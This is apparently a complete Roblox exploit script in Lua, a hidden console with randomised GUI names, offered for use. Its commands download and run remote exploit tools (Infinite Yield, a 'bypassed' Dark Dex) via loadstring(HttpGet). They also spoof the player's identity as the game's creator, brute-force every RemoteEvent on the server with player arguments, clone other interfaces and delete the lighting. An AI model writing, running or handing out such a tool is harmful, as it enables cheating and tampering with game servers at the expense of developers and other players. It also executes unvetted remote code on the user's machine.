local ownedtool = false
local function randomname()
	local specialCharacters = "!@#$%^&*()-_=+[]{}|;:,.<>?/~"
	local specialString = ""
	for i = 1, 10 do
		local randomIndex = math.random(1, #specialCharacters)
		specialString = specialString .. specialCharacters:sub(randomIndex, randomIndex)
	end
	return specialString
end
local gui = Instance.new("ScreenGui")
gui.Parent = game.CoreGui
gui.Name = randomname()
local on = Instance.new("ImageButton")
on.BackgroundTransparency = 1
on.Parent = gui
on.Position = UDim2.new(0.179,0,0.043,0)
on.Size = UDim2.new(0,50,0,50)
on.Image = "http://www.roblox.com/asset/?id=12888461909"
on.ImageColor3 = Color3.new(255,0,0)
on.Name = randomname()
local frame = Instance.new("Frame")
frame.BackgroundColor3 = Color3.new(0,0,0)
frame.BorderColor3 = Color3.new(255,0,0)
frame.BorderSizePixel = 3
frame.Parent = gui
frame.Position = UDim2.new(0.25,0,0,0)
frame.Size = UDim2.new(0,600,0,300)
frame.Name = randomname()
local output = Instance.new("Folder")
output.Parent = frame
output.Name = "output"
for i=0,13 do
	local text = Instance.new("TextLabel")
	text.Parent = output
	text.BackgroundTransparency = 1
	text.Name = "line"..i
	text.Position = UDim2.new(0,0,0,0+(i*20))
	text.Size = UDim2.new(0,600,0,20)
	text.FontFace.Bold = true
	text.Text = ""
	text.TextColor3 = Color3.new(0,0,0)
	text.TextStrokeColor3 = Color3.new(255,0,0)
	text.TextStrokeTransparency = 0
	text.TextScaled = true
	text.TextXAlignment = Enum.TextXAlignment.Left
end
output.line0.Text = "Enter <help> to check commands"
output.line13.Text = "Made By Lone1045 🐟"
local control = Instance.new("Folder")
control.Parent = frame
control.Name = randomname()
local send = Instance.new("ImageButton")
send.BackgroundTransparency = 1
send.Parent = control
send.Position = UDim2.new(0.917,0,0.933,0)
send.Size = UDim2.new(0,50,0,20)
send.Image = "http://www.roblox.com/asset/?id=76645474804869"
send.ImageColor3 = Color3.new(255,0,0)
send.Name = randomname()
local input = Instance.new("TextBox")
input.BackgroundColor3 = Color3.new(0.392157, 0, 0)
input.Position = UDim2.new(0,0,0.933,0)
input.Size = UDim2.new(0,550,0,20)
input.TextStrokeColor3 = Color3.new(255,0,0)
input.TextScaled = true
input.TextStrokeTransparency = 0
input.TextColor3 = Color3.new(0,0,0)
input.TextXAlignment = Enum.TextXAlignment.Left
input.Parent = control
input.BackgroundTransparency = 0.5
input.PlaceholderText = "Enter Your Command"
input.PlaceholderColor3 = Color3.new(0,0,0)
input.Text = "Enter Your Command"
input.Name = randomname()
local background = Instance.new("ImageLabel")
background.Image = "http://www.roblox.com/asset/?id=12888461909"
background.ImageColor3 = Color3.new(255,0,0)
background.Parent = control
background.ImageTransparency = 0.75
background.ScaleType = Enum.ScaleType.Crop
background.Position = UDim2.new(0,0,0,0)
background.Size = UDim2.new(0,600,0,300)
background.BackgroundTransparency = 1
background.Name = randomname()

on.MouseButton1Click:Connect(function()
	if frame.Visible == true then
		frame.Visible = false
	else
		frame.Visible = true
	end
end)

game:GetService("UserInputService").InputBegan:Connect(function(key)
	if key.KeyCode == Enum.KeyCode.Return then
		local text = string.lower(input.Text)
		--print(text)
		if text == "help" then
			output.line0.Text = "Available Commands: "
			output.line1.Text = "1.  Hide + Second [hide the console for specific time]"
			output.line2.Text = "2.  Exit [exit the console]"
			output.line3.Text = "3.  Iy [start Infinite-Yield]"
			output.line4.Text = "4.  Dex [start DARK DEX V3]"
			output.line5.Text = "5.  Clone [turn yourself into owner]"
			output.line6.Text = "6.  Remote [burte force all the remote (risky)]"
			output.line7.Text = "7.  Gui [clone all gui]"
			output.line8.Text = "8.  NoLight [destroy all light]"
			output.line8.Text = "9.  Clear [clear console]"
		end
		if text:match("%S+") == "hide" then
			local duration = tonumber(text:match("%d+"))
			gui.Enabled = false
			wait(duration)
			gui.Enabled = true
		else 
			if text:match("%d+") == "1" then
				local duration = tonumber(text:match("%s(%d+)$"))
				gui.Enabled = false
				wait(duration)
				gui.Enabled = true
			else
				if text == "exit" or text == "2" then
					gui:Destroy()
				else
					if text == "iy" or text == "3" then
						loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
					else
						if text == "dex" or text == "4" then
							loadstring(game:HttpGet("https://raw.githubusercontent.com/Babyhamsta/RBLX_Scripts/main/Universal/BypassedDarkDexV3.lua", true))()
						else
							if text == "clone" or text == "5" then
								local fakeid = game.CreatorId
								local owner = game.Players:GetPlayerByUserId(fakeid)
								game.Players.LocalPlayer.UserId = owner.UserId
								game.Players.LocalPlayer.Name = owner.Name
								game.Players.LocalPlayer.DisplayName = owner.DisplayName
								game.Players.LocalPlayer.Character.Name = owner.Name
							else
								if text == "remote" or text == "6" then
									local gui = Instance.new("ScreenGui")
									gui.Parent = game.CoreGui
									local mainframe = Instance.new("Frame")
									mainframe.Parent = gui
									mainframe.BackgroundColor3 = Color3.new(0,0,0)
									mainframe.BorderColor3 = Color3.new(255,0,0)
									mainframe.BorderSizePixel = 3
									mainframe.Position = UDim2.new(0.619,0,0.364,0)
									mainframe.Size = UDim2.new(0,250,0,100)
									local close = Instance.new("ImageButton")
									close.Parent = gui
									close.Image = "http://www.roblox.com/asset/?id=12888461909"
									close.ImageColor3 = Color3.new(255,0,0)
									close.BackgroundTransparency = 1
									close.Size = UDim2.new(0,25,0,25)
									close.Position = UDim2.new(0.86,0,0.294,0)

									local times = 0
									local currentindex = 1

									local function fireEvent(event, args,label,no)
										event:FireServer(table.unpack(args))
										wait()
										--print("Request Sent!")
										times = times + 1
										local percent = times / 128 * 100
										label.Text = "Trying " .. math.floor(percent + 0.5) .. "%"
										if math.floor(percent + 0.5) == 100 then
											no.Text = "Next"
										end
									end

									local function bruteforce(event, values, idx, args,label,no)
										if idx > #values then
											fireEvent(event, args,label,no)
											return
										end

										for i = idx, #values do
											local newArgs = {}
											for j = 1, #args do
												table.insert(newArgs, args[j])
											end
											table.insert(newArgs, values[i])

											bruteforce(event, values, i + 1, newArgs,label,no)
										end
									end

									local function create(name,path,event)
										local frame = Instance.new("Frame")
										frame.Parent = mainframe
										frame.BackgroundTransparency = 0
										frame.BackgroundColor3 = Color3.new(0,0,0)
										frame.Position = UDim2.new(0,0,0,0)
										frame.Size = UDim2.new(0,250,0,100)
										local infon = Instance.new("TextLabel")
										infon.BackgroundTransparency = 1
										infon.Parent = frame
										infon.Text = name
										infon.TextStrokeColor3 = Color3.new(255,0,0)
										infon.TextStrokeTransparency = 0
										infon.TextColor3 = Color3.new(0,0,0)
										infon.Size = UDim2.new(0,250,0,25)
										infon.Position = UDim2.new(0,0,0,0)
										infon.TextScaled = true
										local infop = Instance.new("TextLabel")
										infop.BackgroundTransparency = 1
										infop.Parent = frame
										infop.Text = path
										infop.TextStrokeColor3 = Color3.new(255,0,0)
										infop.TextStrokeTransparency = 0
										infop.TextColor3 = Color3.new(0,0,0)
										infop.Size = UDim2.new(0,250,0,25)
										infop.Position = UDim2.new(0,0,0.25,0)
										infop.TextScaled = true
										local yes = Instance.new("TextButton")
										yes.Parent = frame
										yes.BackgroundTransparency = 1
										yes.TextStrokeColor3 = Color3.new(255,0,0)
										yes.TextColor3 = Color3.new(0,0,0)
										yes.Size = UDim2.new(0,125,0,50)
										yes.Position = UDim2.new(0.5,0,0.52,0)
										yes.Text = "Yes"
										yes.TextStrokeTransparency = 0
										yes.TextScaled = true
										local no = Instance.new("TextButton")
										no.Parent = frame
										no.BackgroundTransparency = 1
										no.TextStrokeColor3 = Color3.new(255,0,0)
										no.TextColor3 = Color3.new(0,0,0)
										no.Size = UDim2.new(0,125,0,50)
										no.Position = UDim2.new(0,0,0.52,0)
										no.Text = "No"
										no.TextStrokeTransparency = 0
										no.TextScaled = true

										frame.ZIndex = currentindex+1
										infon.ZIndex = currentindex+2
										infop.ZIndex = currentindex+2
										yes.ZIndex = currentindex+2
										no.ZIndex = currentindex+2
										currentindex = currentindex+2

										yes.MouseButton1Click:Connect(function()
											times = 0
											local value = {
												game.Players.LocalPlayer,
												game.Players.LocalPlayer.Character,
												game.Players.LocalPlayer.Name,
												game.Players.LocalPlayer.Character.Humanoid,
												game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame,
												Vector3.new(0, 0, 0),
												1045,
												DateTime.now()
											}
											bruteforce(event,value,1,{},infon,no)
										end)
										no.MouseButton1Click:Connect(function()
											frame:Destroy()
										end)
									end

									local function findRemoteEvents(parent, path)
										for _, child in pairs(parent:GetChildren()) do
											local childPath = path .. "/" .. child.Name
											if child:IsA("RemoteEvent") then
												create(child.Name,childPath,child)
												print("Found RemoteEvent: ",child.Name,childPath)
											end
											findRemoteEvents(child, childPath)
										end
									end

									for _, service in pairs(game:GetChildren()) do
										findRemoteEvents(service, service.Name)
									end

									close.MouseButton1Click:Connect(function()
										gui:Destroy()
									end)
								else
									if text == "gui" or text == "7" then
										local gui = Instance.new("ScreenGui")
										gui.Parent = game.CoreGui
										local mainframe = Instance.new("Frame")
										mainframe.Parent = gui
										mainframe.BackgroundColor3 = Color3.new(0,0,0)
										mainframe.BorderColor3 = Color3.new(255,0,0)
										mainframe.BorderSizePixel = 3
										mainframe.Position = UDim2.new(0.043,0,0.364,0)
										mainframe.Size = UDim2.new(0,250,0,100)
										local close = Instance.new("ImageButton")
										close.Parent = gui
										close.Image = "http://www.roblox.com/asset/?id=12888461909"
										close.ImageColor3 = Color3.new(255,0,0)
										close.BackgroundTransparency = 1
										close.Size = UDim2.new(0,25,0,25)
										close.Position = UDim2.new(0.285,0,0.294,0)

										local currentindex = 1827464231
										local last 

										local function create(name,path,child)
											local frame = Instance.new("Frame")
											frame.Parent = mainframe
											frame.BackgroundTransparency = 0
											frame.BackgroundColor3 = Color3.new(0,0,0)
											frame.Position = UDim2.new(0,0,0,0)
											frame.Size = UDim2.new(0,250,0,100)
											local infon = Instance.new("TextLabel")
											infon.BackgroundTransparency = 1
											infon.Parent = frame
											infon.Text = name
											infon.TextStrokeColor3 = Color3.new(255,0,0)
											infon.TextStrokeTransparency = 0
											infon.TextColor3 = Color3.new(0,0,0)
											infon.Size = UDim2.new(0,250,0,25)
											infon.Position = UDim2.new(0,0,0,0)
											infon.TextScaled = true
											local infop = Instance.new("TextLabel")
											infop.BackgroundTransparency = 1
											infop.Parent = frame
											infop.Text = path
											infop.TextStrokeColor3 = Color3.new(255,0,0)
											infop.TextStrokeTransparency = 0
											infop.TextColor3 = Color3.new(0,0,0)
											infop.Size = UDim2.new(0,250,0,25)
											infop.Position = UDim2.new(0,0,0.25,0)
											infop.TextScaled = true
											local yes = Instance.new("TextButton")
											yes.Parent = frame
											yes.BackgroundTransparency = 1
											yes.TextStrokeColor3 = Color3.new(255,0,0)
											yes.TextColor3 = Color3.new(0,0,0)
											yes.Size = UDim2.new(0,83,0,50)
											yes.Position = UDim2.new(0.668,0,0.52,0)
											yes.Text = "Yes"
											yes.TextStrokeTransparency = 0
											yes.TextScaled = true
											local no = Instance.new("TextButton")
											no.Parent = frame
											no.BackgroundTransparency = 1
											no.TextStrokeColor3 = Color3.new(255,0,0)
											no.TextColor3 = Color3.new(0,0,0)
											no.Size = UDim2.new(0,83,0,50)
											no.Position = UDim2.new(0,0,0.52,0)
											no.Text = "No"
											no.TextStrokeTransparency = 0
											no.TextScaled = true
											local undo = Instance.new("TextButton")
											undo.Parent = frame
											undo.BackgroundTransparency = 1
											undo.TextStrokeColor3 = Color3.new(255,0,0)
											undo.TextColor3 = Color3.new(0,0,0)
											undo.Size = UDim2.new(0,84,0,50)
											undo.Position = UDim2.new(0.332,0,0.52,0)
											undo.Text = "Undo"
											undo.TextStrokeTransparency = 0
											undo.TextScaled = true

											frame.ZIndex = currentindex+1
											infon.ZIndex = currentindex+2
											infop.ZIndex = currentindex+2
											yes.ZIndex = currentindex+2
											no.ZIndex = currentindex+2
											undo.ZIndex = currentindex+2
											currentindex = currentindex+2

											yes.MouseButton1Click:Connect(function()
												local g = child:Clone()
												g.Parent = game.CoreGui
												g.Enabled = true
												last = g
											end)
											no.MouseButton1Click:Connect(function()
												frame:Destroy()
											end)
											undo.MouseButton1Click:Connect(function()
												if last and last:IsA("ScreenGui") then
													last:Destroy()
												end
											end)
										end

										local function findgui(parent, path)
											for _, child in pairs(parent:GetChildren()) do
												local childPath = path .. "/" .. child.Name
												if child:IsA("ScreenGui") then
													create(child.Name,childPath,child)
													--print("Found RemoteEvent: ",child.Name,childPath)
												end
												findgui(child, childPath)
											end
										end

										for _, service in pairs(game:GetChildren()) do
											findgui(service, service.Name)
										end

										close.MouseButton1Click:Connect(function()
											gui:Destroy()
										end)
									else
										if text == "nolight" or text == "8" then
											for _,v in pairs(game.Lighting:GetChildren()) do
												v:Destroy()
											end
										else
											if text == "clear" or text == "9" then
												output.line0.Text = ""
												output.line1.Text = ""
												output.line2.Text = ""
												output.line3.Text = ""
												output.line4.Text = ""
												output.line5.Text = ""
												output.line6.Text = ""
												output.line7.Text = ""
												output.line8.Text = ""
												output.line9.Text = ""
											end
										end
									end
								end
							end
						end
					end
				end 
			end
		end
	end
end)

send.MouseButton1Click:Connect(function()
	local text = string.lower(input.Text)
	--print(text)
	if text == "help" then
		output.line0.Text = "Available Commands: "
		output.line1.Text = "1.  Hide + Second [hide the console for specific time]"
		output.line2.Text = "2.  Exit [exit the console]"
		output.line3.Text = "3.  Iy [start Infinite-Yield]"
		output.line4.Text = "4.  Dex [start DARK DEX V3]"
		output.line5.Text = "5.  Clone [turn yourself into owner]"
		output.line6.Text = "6.  Remote [burte force all the remote (risky)]"
		output.line7.Text = "7.  Gui [clone all gui]"
		output.line8.Text = "8.  NoLight [destroy all light]"
		output.line8.Text = "9.  Clear [clear console]"
	end
	if text:match("%S+") == "hide" then
		local duration = tonumber(text:match("%d+"))
		gui.Enabled = false
		wait(duration)
		gui.Enabled = true
	else 
		if text:match("%d+") == "1" then
			local duration = tonumber(text:match("%s(%d+)$"))
			gui.Enabled = false
			wait(duration)
			gui.Enabled = true
		else
			if text == "exit" or text == "2" then
				gui:Destroy()
			else
				if text == "iy" or text == "3" then
					loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
				else
					if text == "dex" or text == "4" then
						loadstring(game:HttpGet("https://raw.githubusercontent.com/Babyhamsta/RBLX_Scripts/main/Universal/BypassedDarkDexV3.lua", true))()
					else
						if text == "clone" or text == "5" then
							local fakeid = game.CreatorId
							local owner = game.Players:GetPlayerByUserId(fakeid)
							game.Players.LocalPlayer.UserId = owner.UserId
							game.Players.LocalPlayer.Name = owner.Name
							game.Players.LocalPlayer.DisplayName = owner.DisplayName
							game.Players.LocalPlayer.Character.Name = owner.Name
						else
							if text == "remote" or text == "6" then
								local gui = Instance.new("ScreenGui")
								gui.Parent = game.CoreGui
								local mainframe = Instance.new("Frame")
								mainframe.Parent = gui
								mainframe.BackgroundColor3 = Color3.new(0,0,0)
								mainframe.BorderColor3 = Color3.new(255,0,0)
								mainframe.BorderSizePixel = 3
								mainframe.Position = UDim2.new(0.619,0,0.364,0)
								mainframe.Size = UDim2.new(0,250,0,100)
								local background = Instance.new("ImageLabel")
								background.Image = "http://www.roblox.com/asset/?id=12888461909"
								background.ImageColor3 = Color3.new(255,0,0)
								background.Parent = gui
								background.ImageTransparency = 0.75
								background.ScaleType = Enum.ScaleType.Crop
								background.Position = UDim2.new(0.619,0,0.364,0)
								background.Size = UDim2.new(0,250,0,100)
								background.BackgroundTransparency = 1
								background.ZIndex = 999999999
								background.ScaleType = Enum.ScaleType.Crop
								local close = Instance.new("ImageButton")
								close.Parent = gui
								close.Image = "http://www.roblox.com/asset/?id=12888461909"
								close.ImageColor3 = Color3.new(255,0,0)
								close.BackgroundTransparency = 1
								close.Size = UDim2.new(0,25,0,25)
								close.Position = UDim2.new(0.86,0,0.294,0)

								local times = 0
								local currentindex = 1

								local function fireEvent(event, args,label,no)
									event:FireServer(table.unpack(args))
									wait()
									--print("Request Sent!")
									times = times + 1
									local percent = times / 128 * 100
									label.Text = "Trying " .. math.floor(percent + 0.5) .. "%"
									if math.floor(percent + 0.5) == 100 then
										no.Text = "Next"
									end
								end

								local function bruteforce(event, values, idx, args,label,no)
									if idx > #values then
										fireEvent(event, args,label,no)
										return
									end

									for i = idx, #values do
										local newArgs = {}
										for j = 1, #args do
											table.insert(newArgs, args[j])
										end
										table.insert(newArgs, values[i])

										bruteforce(event, values, i + 1, newArgs,label,no)
									end
								end

								local function create(name,path,event)
									local frame = Instance.new("Frame")
									frame.Parent = mainframe
									frame.BackgroundTransparency = 0
									frame.BackgroundColor3 = Color3.new(0,0,0)
									frame.Position = UDim2.new(0,0,0,0)
									frame.Size = UDim2.new(0,250,0,100)
									local infon = Instance.new("TextLabel")
									infon.BackgroundTransparency = 1
									infon.Parent = frame
									infon.Text = name
									infon.TextStrokeColor3 = Color3.new(255,0,0)
									infon.TextStrokeTransparency = 0
									infon.TextColor3 = Color3.new(0,0,0)
									infon.Size = UDim2.new(0,250,0,25)
									infon.Position = UDim2.new(0,0,0,0)
									infon.TextScaled = true
									local infop = Instance.new("TextLabel")
									infop.BackgroundTransparency = 1
									infop.Parent = frame
									infop.Text = path
									infop.TextStrokeColor3 = Color3.new(255,0,0)
									infop.TextStrokeTransparency = 0
									infop.TextColor3 = Color3.new(0,0,0)
									infop.Size = UDim2.new(0,250,0,25)
									infop.Position = UDim2.new(0,0,0.25,0)
									infop.TextScaled = true
									local yes = Instance.new("TextButton")
									yes.Parent = frame
									yes.BackgroundTransparency = 1
									yes.TextStrokeColor3 = Color3.new(255,0,0)
									yes.TextColor3 = Color3.new(0,0,0)
									yes.Size = UDim2.new(0,125,0,50)
									yes.Position = UDim2.new(0.5,0,0.52,0)
									yes.Text = "Yes"
									yes.TextStrokeTransparency = 0
									yes.TextScaled = true
									local no = Instance.new("TextButton")
									no.Parent = frame
									no.BackgroundTransparency = 1
									no.TextStrokeColor3 = Color3.new(255,0,0)
									no.TextColor3 = Color3.new(0,0,0)
									no.Size = UDim2.new(0,125,0,50)
									no.Position = UDim2.new(0,0,0.52,0)
									no.Text = "No"
									no.TextStrokeTransparency = 0
									no.TextScaled = true

									frame.ZIndex = currentindex+1
									infon.ZIndex = currentindex+2
									infop.ZIndex = currentindex+2
									yes.ZIndex = currentindex+2
									no.ZIndex = currentindex+2
									currentindex = currentindex+2

									yes.MouseButton1Click:Connect(function()
										times = 0
										local value = {
											game.Players.LocalPlayer,
											game.Players.LocalPlayer.Character,
											game.Players.LocalPlayer.Name,
											game.Players.LocalPlayer.Character.Humanoid,
											game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame,
											Vector3.new(0, 0, 0),
											1045,
											DateTime.now()
										}
										bruteforce(event,value,1,{},infon,no)
									end)
									no.MouseButton1Click:Connect(function()
										frame:Destroy()
									end)
								end

								local function findRemoteEvents(parent, path)
									for _, child in pairs(parent:GetChildren()) do
										local childPath = path .. "/" .. child.Name
										if child:IsA("RemoteEvent") then
											create(child.Name,childPath,child)
											--print("Found RemoteEvent: ",child.Name,childPath)
										end
										findRemoteEvents(child, childPath)
									end
								end

								for _, service in pairs(game:GetChildren()) do
									findRemoteEvents(service, service.Name)
								end

								close.MouseButton1Click:Connect(function()
									gui:Destroy()
								end)
							else
								if text == "gui" or text == "7" then
									local gui = Instance.new("ScreenGui")
									gui.Parent = game.CoreGui
									local mainframe = Instance.new("Frame")
									mainframe.Parent = gui
									mainframe.BackgroundColor3 = Color3.new(0,0,0)
									mainframe.BorderColor3 = Color3.new(255,0,0)
									mainframe.BorderSizePixel = 3
									mainframe.Position = UDim2.new(0.043,0,0.364,0)
									mainframe.Size = UDim2.new(0,250,0,100)
									local close = Instance.new("ImageButton")
									close.Parent = gui
									close.Image = "http://www.roblox.com/asset/?id=12888461909"
									close.ImageColor3 = Color3.new(255,0,0)
									close.BackgroundTransparency = 1
									close.Size = UDim2.new(0,25,0,25)
									close.Position = UDim2.new(0.285,0,0.294,0)

									local currentindex = 1827464231
									local last 

									local function create(name,path,child)
										local frame = Instance.new("Frame")
										frame.Parent = mainframe
										frame.BackgroundTransparency = 0
										frame.BackgroundColor3 = Color3.new(0,0,0)
										frame.Position = UDim2.new(0,0,0,0)
										frame.Size = UDim2.new(0,250,0,100)
										local infon = Instance.new("TextLabel")
										infon.BackgroundTransparency = 1
										infon.Parent = frame
										infon.Text = name
										infon.TextStrokeColor3 = Color3.new(255,0,0)
										infon.TextStrokeTransparency = 0
										infon.TextColor3 = Color3.new(0,0,0)
										infon.Size = UDim2.new(0,250,0,25)
										infon.Position = UDim2.new(0,0,0,0)
										infon.TextScaled = true
										local infop = Instance.new("TextLabel")
										infop.BackgroundTransparency = 1
										infop.Parent = frame
										infop.Text = path
										infop.TextStrokeColor3 = Color3.new(255,0,0)
										infop.TextStrokeTransparency = 0
										infop.TextColor3 = Color3.new(0,0,0)
										infop.Size = UDim2.new(0,250,0,25)
										infop.Position = UDim2.new(0,0,0.25,0)
										infop.TextScaled = true
										local yes = Instance.new("TextButton")
										yes.Parent = frame
										yes.BackgroundTransparency = 1
										yes.TextStrokeColor3 = Color3.new(255,0,0)
										yes.TextColor3 = Color3.new(0,0,0)
										yes.Size = UDim2.new(0,83,0,50)
										yes.Position = UDim2.new(0.668,0,0.52,0)
										yes.Text = "Yes"
										yes.TextStrokeTransparency = 0
										yes.TextScaled = true
										local no = Instance.new("TextButton")
										no.Parent = frame
										no.BackgroundTransparency = 1
										no.TextStrokeColor3 = Color3.new(255,0,0)
										no.TextColor3 = Color3.new(0,0,0)
										no.Size = UDim2.new(0,83,0,50)
										no.Position = UDim2.new(0,0,0.52,0)
										no.Text = "No"
										no.TextStrokeTransparency = 0
										no.TextScaled = true
										local undo = Instance.new("TextButton")
										undo.Parent = frame
										undo.BackgroundTransparency = 1
										undo.TextStrokeColor3 = Color3.new(255,0,0)
										undo.TextColor3 = Color3.new(0,0,0)
										undo.Size = UDim2.new(0,84,0,50)
										undo.Position = UDim2.new(0.332,0,0.52,0)
										undo.Text = "Undo"
										undo.TextStrokeTransparency = 0
										undo.TextScaled = true

										frame.ZIndex = currentindex+1
										infon.ZIndex = currentindex+2
										infop.ZIndex = currentindex+2
										yes.ZIndex = currentindex+2
										no.ZIndex = currentindex+2
										undo.ZIndex = currentindex+2
										currentindex = currentindex+2

										yes.MouseButton1Click:Connect(function()
											local g = child:Clone()
											g.Parent = game.CoreGui
											g.Enabled = true
											last = g
										end)
										no.MouseButton1Click:Connect(function()
											frame:Destroy()
										end)
										undo.MouseButton1Click:Connect(function()
											if last and last:IsA("ScreenGui") then
												last:Destroy()
											end
										end)
									end

									local function findgui(parent, path)
										for _, child in pairs(parent:GetChildren()) do
											local childPath = path .. "/" .. child.Name
											if child:IsA("ScreenGui") then
												create(child.Name,childPath,child)
												print("Found RemoteEvent: ",child.Name,childPath)
											end
											findgui(child, childPath)
										end
									end

									for _, service in pairs(game:GetChildren()) do
										findgui(service, service.Name)
									end

									close.MouseButton1Click:Connect(function()
										gui:Destroy()
									end)
								else
									if text == "nolight" or text == "8" then
										for _,v in pairs(game.Lighting:GetChildren()) do
											v:Destroy()
										end
									else
										if text == "clear" or text == "9" then
											output.line0.Text = ""
											output.line1.Text = ""
											output.line2.Text = ""
											output.line3.Text = ""
											output.line4.Text = ""
											output.line5.Text = ""
											output.line6.Text = ""
											output.line7.Text = ""
											output.line8.Text = ""
											output.line9.Text = ""
										end
									end
								end
							end
						end
					end
				end
			end 
		end
	end
end)
